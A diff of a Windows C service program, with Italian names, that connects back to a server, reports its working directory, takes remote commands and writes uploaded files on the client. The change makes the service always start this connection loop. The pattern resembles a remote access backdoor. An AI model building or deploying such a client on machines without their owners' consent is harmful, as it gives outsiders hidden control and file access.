@@ -40,7 +40,6 @@ void chiudiConnessione(SOCKET ConnectSocket);
 
 int ottieniComando(wchar_t *comando);
 void setCartellaCorrente(wchar_t* path, wchar_t* dirCorrente);
-void getCartellaCorrente(wchar_t* temp);
 
 //void test();
 
@@ -49,19 +48,19 @@ void getCartellaCorrente(wchar_t* temp);
 int _tmain(int argc, wchar_t *argv[])
 {
 	//In this case the main service is creating subprocess to handle the real job of the application.
-	if (argc != 1) {
+	/*if (argc != 1) {
 		/*
 			In this case client need to be started. The service periodically call this function.
 			At the end the function called will end the process, so there should be no return.
 		*/
-		if (argv[1][0] == L'c') {
+		//if (argv[1][0] == L'c') {
 			mainConnessioneAlServer();
-		}else if (argv[1][0] == L't') {
+		//}else if (argv[1][0] == L't') {
 			//test();
-		}
-	}
+		//}
+	//}
 	// In this case is the main service starting.
-	else {
+	//else {
 		SERVICE_TABLE_ENTRY ServiceTable[] =
 		{
 			{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
@@ -72,7 +71,7 @@ int _tmain(int argc, wchar_t *argv[])
 		{
 			return GetLastError();
 		}
-	}
+	//}
 
 	return 0;
 }
@@ -89,13 +88,12 @@ void mainConnessioneAlServer() {
 	FILE *read;
 
 	inizializzaConnessione(&socketConnessione);
-
 	GetCurrentDirectory(DEFAULT_BUFLEN, path);
-
+	wcscat_s(path, DEFAULT_BUFLEN, L"\n");
 	while (true) {
 		//send
 		invia(socketConnessione, path);
-		invia(socketConnessione, L"end");
+		invia(socketConnessione, L"end\n");
 
 		//recive
 		riceviStringa(socketConnessione, comando);
@@ -107,7 +105,7 @@ void mainConnessioneAlServer() {
 		else if (cmdN == 2) { //Upload to client
 			wchar_t* fileName = &comando[3];
 			FILE *file;
-			int e = _wfopen_s(&file, fileName, L"a");
+			int e = _wfopen_s(&file, fileName, L"ab");
 			if (e == 0) {
 				invia(socketConnessione, L"Per ora è possibile mandare solo 512 wchar_t senza invio - da migliorare: ");
 				invia(socketConnessione, L"end");
@@ -190,6 +188,7 @@ void setCartellaCorrente(wchar_t* relative, wchar_t* dirCorrente) {
 	}
 	int i = _wchdir(dirCorrente);
 	GetCurrentDirectory(DEFAULT_BUFLEN, dirCorrente);
+	wcscat_s(dirCorrente, DEFAULT_BUFLEN, L"\n");
 }
 
 
